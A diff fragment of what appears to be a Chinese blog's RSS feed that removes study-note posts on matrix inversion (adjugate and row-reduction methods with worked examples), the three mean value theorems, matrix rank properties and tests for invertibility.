-故$A$可逆。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;步骤2：计算代数余子式，构造伴随矩阵$A^*$&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;$A_{11} = (-1)^{1+1} \times 4 = 4$，$A_{12} = (-1)^{1+2} \times 3 = -3$&lt;/li&gt;
-&lt;li&gt;$A_{21} = (-1)^{2+1} \times 2 = -2$，$A_{22} = (-1)^{2+2} \times 1 = 1$
-因此，伴随矩阵：
-
-$$
-  A^* = \begin{pmatrix} A_{11} &amp; A_{21} \\ A_{12} &amp; A_{22} \end{pmatrix} = \begin{pmatrix} 4 &amp; -2 \\ -3 &amp; 1 \end{pmatrix}
-  $$&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;步骤3：代入逆矩阵公式
-&lt;/p&gt;
-$$
-  A^{-1} = \frac{1}{|A|}A^* = \frac{1}{-2} \begin{pmatrix} 4 &amp; -2 \\ -3 &amp; 1 \end{pmatrix} = \begin{pmatrix} -2 &amp; 1 \\ \frac{3}{2} &amp; -\frac{1}{2} \end{pmatrix}
-  $$&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;验证（可选）：
-&lt;/p&gt;
-$$
-  A \cdot A^{-1} = \begin{pmatrix} 1 &amp; 2 \\ 3 &amp; 4 \end{pmatrix} \begin{pmatrix} -2 &amp; 1 \\ \frac{3}{2} &amp; -\frac{1}{2} \end{pmatrix} = \begin{pmatrix} 1 \times (-2) + 2 \times \frac{3}{2} &amp; 1 \times 1 + 2 \times (-\frac{1}{2}) \\ 3 \times (-2) + 4 \times \frac{3}{2} &amp; 3 \times 1 + 4 \times (-\frac{1}{2}) \end{pmatrix} = \begin{pmatrix} 1 &amp; 0 \\ 0 &amp; 1 \end{pmatrix} = I_2
-  $$&lt;p&gt;
-验证成立。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;二初等变换法求逆矩阵&#34;&gt;二、初等变换法求逆矩阵
-&lt;/h3&gt;&lt;h4 id=&#34;1-核心原理&#34;&gt;1. 核心原理
-&lt;/h4&gt;&lt;p&gt;对于n阶可逆矩阵$A$，构造&lt;strong&gt;增广矩阵&lt;/strong&gt;$[A \mid I_n]$（$I_n$为n阶单位矩阵），通过&lt;strong&gt;初等行变换&lt;/strong&gt;（不可混用列变换）将左侧的$A$化为$I_n$，此时右侧原$I_n$会同步化为$A^{-1}$，即：
-&lt;/p&gt;
-$$
-[A \mid I_n] \xrightarrow{初等行变换} [I_n \mid A^{-1}]
-$$&lt;h4 id=&#34;2-关键步骤&#34;&gt;2. 关键步骤
-&lt;/h4&gt;&lt;ol&gt;
-&lt;li&gt;构造增广矩阵：将$A$与同阶单位矩阵并排拼接，形成$[A \mid I_n]$；&lt;/li&gt;
-&lt;li&gt;初等行变换（仅3种：换行、某行乘非零常数、某行加另一行的$k$倍）；&lt;/li&gt;
-&lt;li&gt;当左侧$A$化为$I_n$时，右侧矩阵即为$A^{-1}$；&lt;/li&gt;
-&lt;li&gt;验证（可选）：计算$A \cdot A^{-1}$，若结果为$I_n$则正确。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h4 id=&#34;3-示例用初等变换法求3阶矩阵的逆&#34;&gt;3. 示例：用初等变换法求3阶矩阵的逆
-&lt;/h4&gt;&lt;p&gt;设$A = \begin{pmatrix} 1 &amp;amp; 0 &amp;amp; 1 \ 2 &amp;amp; 1 &amp;amp; 0 \ -3 &amp;amp; 2 &amp;amp; -5 \end{pmatrix}$，求$A^{-1}$。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;步骤1：构造增广矩阵$[A \mid I_3]$
-&lt;/p&gt;
-$$
-  [A \mid I_3] = \begin{pmatrix} 1 &amp; 0 &amp; 1 &amp; \vdots &amp; 1 &amp; 0 &amp; 0 \\ 2 &amp; 1 &amp; 0 &amp; \vdots &amp; 0 &amp; 1 &amp; 0 \\ -3 &amp; 2 &amp; -5 &amp; \vdots &amp; 0 &amp; 0 &amp; 1 \end{pmatrix}
-  $$&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;步骤2：初等行变换&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;消去第2、3行第1列元素：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;第2行 = 第2行 - 2×第1行：$R_2 = R_2 - 2R_1$&lt;/li&gt;
-&lt;li&gt;第3行 = 第3行 + 3×第1行：$R_3 = R_3 + 3R_1$
-得到：
-
-$$
-     \begin{pmatrix} 1 &amp; 0 &amp; 1 &amp; \vdots &amp; 1 &amp; 0 &amp; 0 \\ 0 &amp; 1 &amp; -2 &amp; \vdots &amp; -2 &amp; 1 &amp; 0 \\ 0 &amp; 2 &amp; -2 &amp; \vdots &amp; 3 &amp; 0 &amp; 1 \end{pmatrix}
-     $$&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;消去第3行第2列元素：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;第3行 = 第3行 - 2×第2行：$R_3 = R_3 - 2R_2$
-得到：
-
-$$
-     \begin{pmatrix} 1 &amp; 0 &amp; 1 &amp; \vdots &amp; 1 &amp; 0 &amp; 0 \\ 0 &amp; 1 &amp; -2 &amp; \vdots &amp; -2 &amp; 1 &amp; 0 \\ 0 &amp; 0 &amp; 2 &amp; \vdots &amp; 7 &amp; -2 &amp; 1 \end{pmatrix}
-     $$&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;化为行最简形（首元为1，消去上方对应元素）：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;第3行 = 第3行 × $\frac{1}{2}$：$R_3 = \frac{1}{2}R_3$&lt;/li&gt;
-&lt;li&gt;第1行 = 第1行 - 1×第3行：$R_1 = R_1 - R_3$&lt;/li&gt;
-&lt;li&gt;第2行 = 第2行 + 2×第3行：$R_2 = R_2 + 2R_3$
-最终得到：
-
-$$
-     \begin{pmatrix} 1 &amp; 0 &amp; 0 &amp; \vdots &amp; -\frac{5}{2} &amp; 1 &amp; -\frac{1}{2} \\ 0 &amp; 1 &amp; 0 &amp; \vdots &amp; 5 &amp; -1 &amp; 1 \\ 0 &amp; 0 &amp; 1 &amp; \vdots &amp; \frac{7}{2} &amp; -1 &amp; \frac{1}{2} \end{pmatrix}
-     $$&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;步骤3：得到逆矩阵
-左侧已化为$I_3$，右侧即为$A^{-1}$：
-&lt;/p&gt;
-$$
-  A^{-1} = \begin{pmatrix} -\frac{5}{2} &amp; 1 &amp; -\frac{1}{2} \\ 5 &amp; -1 &amp; 1 \\ \frac{7}{2} &amp; -1 &amp; \frac{1}{2} \end{pmatrix}
-  $$&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;验证（可选）：
-计算$A \cdot A^{-1}$，结果为$I_3$（过程略），验证成立。&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        </item>
-        <item>
         <title>恰到好处的补完—《轻音少女》观后感</title>
         <link>https://www.retr0.xyz/p/%E6%81%B0%E5%88%B0%E5%A5%BD%E5%A4%84%E7%9A%84%E8%A1%A5%E5%AE%8C%E8%BD%BB%E9%9F%B3%E5%B0%91%E5%A5%B3%E8%A7%82%E5%90%8E%E6%84%9F/</link>
         <pubDate>Sat, 01 Nov 2025 09:58:38 +0800</pubDate>
@@ -27548,104 +27678,6 @@ $$
 	
 &gt;&lt;/p&gt;
 &lt;center&gt;最后一次在学园祭上演出完的众人&lt;/center&gt;
-</description>
-        </item>
-        <item>
-        <title>三个微分中值定理</title>
-        <link>https://www.retr0.xyz/p/%E4%B8%89%E4%B8%AA%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86/</link>
-        <pubDate>Wed, 29 Oct 2025 12:31:38 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E4%B8%89%E4%B8%AA%E5%BE%AE%E5%88%86%E4%B8%AD%E5%80%BC%E5%AE%9A%E7%90%86/</guid>
-        <description>&lt;h3 id=&#34;一罗尔定理rolles-theorem&#34;&gt;一、罗尔定理（Rolle&amp;rsquo;s Theorem）
-&lt;/h3&gt;&lt;h4 id=&#34;1-核心条件&#34;&gt;1. 核心条件
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;函数 $f(x)$ 在闭区间 $[a, b]$ 上 &lt;strong&gt;连续&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;函数 $f(x)$ 在开区间 $(a, b)$ 内 &lt;strong&gt;可导&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;端点函数值相等：$f(a) = f(b)$。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-结论&#34;&gt;2. 结论
-&lt;/h4&gt;&lt;p&gt;存在至少一点 $\xi \in (a, b)$，使得 $f&amp;rsquo;(\xi) = 0$。&lt;/p&gt;
-&lt;h4 id=&#34;3-使用例子&#34;&gt;3. 使用例子
-&lt;/h4&gt;&lt;p&gt;设 $f(x) = x^2 - 2x$，区间 $[0, 2]$。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;验证条件：$f(x)$ 是多项式（闭区间连续、开区间可导）；$f(0) = 0$，$f(2) = 0$，满足 $f(0)=f(2)$；&lt;/li&gt;
-&lt;li&gt;应用结论：求导得 $f&amp;rsquo;(x) = 2x - 2$，令 $f&amp;rsquo;(x)=0$，解得 $x=1$，即 $\xi=1 \in (0,2)$，符合定理。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;二拉格朗日中值定理lagranges-mean-value-theorem&#34;&gt;二、拉格朗日中值定理（Lagrange&amp;rsquo;s Mean Value Theorem）
-&lt;/h3&gt;&lt;h4 id=&#34;1-核心条件-1&#34;&gt;1. 核心条件
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;函数 $f(x)$ 在闭区间 $[a, b]$ 上 &lt;strong&gt;连续&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;函数 $f(x)$ 在开区间 $(a, b)$ 内 &lt;strong&gt;可导&lt;/strong&gt;。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-结论-1&#34;&gt;2. 结论
-&lt;/h4&gt;&lt;p&gt;存在至少一点 $\xi \in (a, b)$，使得 $f&amp;rsquo;(\xi) = \frac{f(b) - f(a)}{b - a}$（几何意义：曲线在 $\xi$ 处的切线与端点连线平行）。&lt;/p&gt;
-&lt;h4 id=&#34;3-使用例子-1&#34;&gt;3. 使用例子
-&lt;/h4&gt;&lt;p&gt;设 $f(x) = \ln x$，区间 $[1, e]$。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;验证条件：$f(x)$ 在 $[1,e]$ 连续、$(1,e)$ 可导；&lt;/li&gt;
-&lt;li&gt;应用结论：端点斜率 $\frac{f(e) - f(1)}{e - 1} = \frac{1 - 0}{e - 1} = \frac{1}{e - 1}$；求导得 $f&amp;rsquo;(x) = \frac{1}{x}$，令 $\frac{1}{x} = \frac{1}{e - 1}$，解得 $x = e - 1 \in (1,e)$，即 $\xi = e - 1$，符合定理。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;三柯西中值定理cauchys-mean-value-theorem&#34;&gt;三、柯西中值定理（Cauchy&amp;rsquo;s Mean Value Theorem）
-&lt;/h3&gt;&lt;h4 id=&#34;1-核心条件-2&#34;&gt;1. 核心条件
-&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;函数 $f(x)$、$g(x)$ 均在闭区间 $[a, b]$ 上 &lt;strong&gt;连续&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;函数 $f(x)$、$g(x)$ 均在开区间 $(a, b)$ 内 &lt;strong&gt;可导&lt;/strong&gt;；&lt;/li&gt;
-&lt;li&gt;对任意 $x \in (a, b)$，$g&amp;rsquo;(x) \neq 0$；&lt;/li&gt;
-&lt;li&gt;端点函数值不等：$g(a) \neq g(b)$。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;2-结论-2&#34;&gt;2. 结论
-&lt;/h4&gt;&lt;p&gt;存在至少一点 $\xi \in (a, b)$，使得 $\frac{f(b) - f(a)}{g(b) - g(a)} = \frac{f&amp;rsquo;(\xi)}{g&amp;rsquo;(\xi)}$（拉格朗日中值定理的推广，$g(x)=x$ 时退化为拉格朗日定理）。&lt;/p&gt;
-&lt;h4 id=&#34;3-使用例子-2&#34;&gt;3. 使用例子
-&lt;/h4&gt;&lt;p&gt;设 $f(x) = \sin x$，$g(x) = \cos x$，区间 $[0, \frac{\pi}{2}]$。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;验证条件：$f(x)$、$g(x)$ 均连续可导；$g&amp;rsquo;(x) = -\sin x$，在 $(0, \frac{\pi}{2})$ 内不为0；$g(0)=1 \neq g(\frac{\pi}{2})=0$；&lt;/li&gt;
-&lt;li&gt;应用结论：增量比 $\frac{f(\frac{\pi}{2}) - f(0)}{g(\frac{\pi}{2}) - g(0)} = \frac{1 - 0}{0 - 1} = -1$；导数比 $\frac{f&amp;rsquo;(\xi)}{g&amp;rsquo;(\xi)} = \frac{\cos \xi}{-\sin \xi} = -\cot \xi$；令 $-\cot \xi = -1$，解得 $\xi = \frac{\pi}{4} \in (0, \frac{\pi}{2})$，符合定理。&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        </item>
-        <item>
-        <title>矩阵的秩及其性质</title>
-        <link>https://www.retr0.xyz/p/%E7%9F%A9%E9%98%B5%E7%9A%84%E7%A7%A9%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/</link>
-        <pubDate>Tue, 28 Oct 2025 15:27:38 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E7%9F%A9%E9%98%B5%E7%9A%84%E7%A7%A9%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/</guid>
-        <description>&lt;h3 id=&#34;一矩阵的秩核心定义&#34;&gt;一、矩阵的秩（核心定义）
-&lt;/h3&gt;&lt;p&gt;矩阵的秩是&lt;strong&gt;最高阶非零子式的阶数&lt;/strong&gt;，也等于矩阵行向量组/列向量组的“极大无关组个数”(通俗说：最多能找出多少个不互相“多余”的行/列)记为 &lt;/p&gt;
-$$r(A)$$&lt;p&gt;。&lt;/p&gt;
-&lt;h3 id=&#34;二核心性质&#34;&gt;二、核心性质
-&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;非负性与有界性：$\displaystyle 0 \leq r(A) \leq \min{m, n}$（秩是0或正整数，不超过行数和列数）；&lt;/li&gt;
-&lt;li&gt;零矩阵专属：$\displaystyle A = O \iff r(A) = 0$（零矩阵秩为0，反之亦然）；&lt;/li&gt;
-&lt;li&gt;转置不变性：$\displaystyle r(A^T) = r(A)$（矩阵与其转置秩相等）；&lt;/li&gt;
-&lt;li&gt;初等变换不变性：初等行/列变换后，矩阵秩不变；&lt;/li&gt;
-&lt;li&gt;和秩不等式：$\displaystyle r(A + B) \leq r(A) + r(B)$（两矩阵和的秩不超过各自秩的和）；&lt;/li&gt;
-&lt;li&gt;乘积秩不等式：$\displaystyle r(AB) \leq \min{r(A), r(B)}$（两矩阵乘积的秩不超过任一矩阵的秩）；&lt;/li&gt;
-&lt;li&gt;可逆矩阵作用：$\displaystyle r(PA) = r(AQ) = r(PAQ) = r(A)$（可逆矩阵左乘/右乘，秩不变）；&lt;/li&gt;
-&lt;li&gt;伴随矩阵秩关系：
-&lt;ul&gt;
-&lt;li&gt;若$\displaystyle r(A) = n$，则$\displaystyle r(A^*) = n$；&lt;/li&gt;
-&lt;li&gt;若$\displaystyle r(A) = n-1$，则$\displaystyle r(A^*) = 1$；&lt;/li&gt;
-&lt;li&gt;若$\displaystyle r(A) &amp;lt; n-1$，则$\displaystyle r(A^*) = 0$；&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;分块矩阵秩：$\displaystyle r\begin{pmatrix} A &amp;amp; O \ O &amp;amp; B \end{pmatrix} = r(A) + r(B)$（对角分块矩阵的秩等于各块秩的和）。&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-        </item>
-        <item>
-        <title>快速判断矩阵是否可逆</title>
-        <link>https://www.retr0.xyz/p/%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9F%A9%E9%98%B5%E6%98%AF%E5%90%A6%E5%8F%AF%E9%80%86/</link>
-        <pubDate>Tue, 28 Oct 2025 15:27:38 +0800</pubDate>
-        
-        <guid>https://www.retr0.xyz/p/%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9F%A9%E9%98%B5%E6%98%AF%E5%90%A6%E5%8F%AF%E9%80%86/</guid>
-        <description>&lt;p&gt;判断n阶方阵A是否可逆，核心看以下&lt;strong&gt;快速等价条件&lt;/strong&gt;（满足其一即可，优先选前2个最便捷）：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;行列式非零：$|A| \neq 0$（直接计算行列式，最快上手）；&lt;/li&gt;
-&lt;li&gt;矩阵满秩：秩$r(A) = n$（通过初等行变换看是否能化为单位矩阵）；&lt;/li&gt;
-&lt;li&gt;齐次方程组$AX = 0$只有零解；&lt;/li&gt;
-&lt;li&gt;行/列向量组线性无关；&lt;/li&gt;
-&lt;li&gt;存在方阵B，使得$AB = BA = I$（I为单位矩阵）。&lt;/li&gt;
-&lt;/ol&gt;
 </description>
         </item>
         <item>
